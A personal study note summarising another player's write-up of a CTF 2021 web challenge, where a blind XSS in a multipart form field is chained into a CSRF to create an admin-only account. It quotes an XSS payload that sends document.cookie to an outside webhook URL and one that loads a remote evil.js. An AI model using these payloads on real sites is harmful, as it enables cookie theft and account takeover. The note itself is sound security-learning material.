---
title: RaaS_Recruitment CyberThreatForce CTF 2021
tags: permanent-note web-xss
references:
---
# RaaS_Recruitment CyberThreatForce CTF 2021

### Raas_Recruitment
- [ ] Was Solved By Me
#### Points - 180 -> 410
#### Description:
We found the **APT403** recruitment site.
Tried to find a way to exploit their website !

**[](https://recruitment.cyberthreatforce-ctf.com/)**


#### Write-Up - MY OWN
 When entering the Website. We're welcomed with
![](https://i.imgur.com/kMjLk9v.png)
After registration We get a message that the  review team will review the application
![](https://i.imgur.com/qTFY32g.png)
- The site also uses `Content-Disposition: multipart/form-data;`, which is interesting 

- The webpage uses newest Apache, so no exploits for CVEs
![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/2.png)
- **There was Hint Given By Administrators** - **It's not SQLi, try different Injection ^^**
	- Not very useful Hint to be honest




#### Notes After The Competition - NOT MY OWN SOLUTION
##### Finding the XSS and Exploiting It
- There actually was a SQL Injection, which was not planned by the authors
- The vulnerability was indeed in `Content-Disposition multipart body`
	- W0rty tried injecting -   `">'>< script>fetch("[https://webhook.site/670142c2-94c0-4669-a9ce-6539d860ce4c/?c="+document.cookie](https://webhook.site/670142c2-94c0-4669-a9ce-6539d860ce4c/?c=%22+document.cookie))< /script>`, which sends the request to his WebHook.
		- Testing XSS with Blind Payloads is way better then just executing `alert()`, because most web pages sanitizes or filters out it. Amazing!
		![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/3.png)
		- The last parameter `name=radio` triggered the XSS payload.
	- W0rty tried to leak /admin/index.php source code with this Blind XSS with the following script
	- ![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/4.png)
		- But the website was limiting the size of his payload
			- He then put the payload into his VPS, and with this payload ->   `">'>< script src="https://midnightflag.fr/evil.js">< /script>` he invoked this code
				- This though didn't work either. It seemed like the index.php source code that he wanted to extract was too big, so he then used `substr` function to select part of the HTML page:
				-  ![alt](https://github.com/W0rty/WU-CyberThreatForce/raw/main/Images/5.png)
					-  This time it succeeded, and he found out from the source code, that the page has a hidden web-page, called `/bingvxyyaknprxtgwexgldwdcrcqrfacDEV/`

##### Analyzing Hidden Page
- After W0rty read the HTML, he noticed weird javascript endpoint called `prcmSDAui9SeXxbuuaUKjEAJ5qIGY9B9vPFMwW19.js`
	-  This JavaScript was obfuscated. After the obfuscation, it seems like it's about the creation of "Dev" user account
		-  **Keep in mind, that only an admin could create a user account, and so W0rty had to perform CSRF Attack, through XSS Injection **
			- SOURCE CODE PROVIDED FOR THE 'BOT' IS ON THE AUTHOR'S ORIGINAL WRITE-UP
				- The first implementation of the bot didn't work, and so he W0rty tried to implement the CSRF in `multipart/form-data`, just like we saw at the 'Contact Form' in the beginning
					- SOURCE CODE PROVIDED FOR THE 'BOT' IS ON THE AUTHOR'S ORIGINAL WRITE-UP
						- **This worked and W0rty received an attack**. 
	
- There were so much in this challenge. It is interesting that initially the Challenge was rated for 180 points(the easiest challenge), and later to 410 points. Maybe authors made it more complicated?
- Compared to me, W0rax did an amazing job!

##### Lessons taken:
- Test XSS with Blind Payloads
- Have an ability to host your payloads on your own VPS
- Check which type of data the WebApp accepts when building your payload
- And a lot more, related to just W0rty Backend Web Programming Skills!
					
##### References:
[W0rty Write-Up](https://github.com/W0rty/WU-CyberThreatForce/blob/main/README-EN.md)
